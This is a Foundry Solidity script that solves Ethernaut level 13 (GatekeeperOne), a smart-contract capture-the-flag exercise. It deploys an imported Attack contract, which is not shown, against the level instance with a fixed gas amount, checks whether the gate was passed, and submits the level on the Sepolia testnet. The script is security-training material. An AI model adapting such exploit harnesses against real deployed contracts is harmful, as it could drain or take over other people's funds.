// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {GatekeeperOne} from "../src/Level13.sol";
import {Attack} from "../src/Level13Attack.sol";

contract Level13 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        GatekeeperOne instance = GatekeeperOne(vm.envAddress("LVL13_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attacker = new Attack();
        attacker.atatatak{gas: 100000}(instance);

        if (instance.entrant() != caller) {
            console2.log("call failed");
        } else ethernaut.submitLevelInstance(address(instance));
    }
}

// forge script script/Level13.s.sol --broadcast --rpc-url sepolia
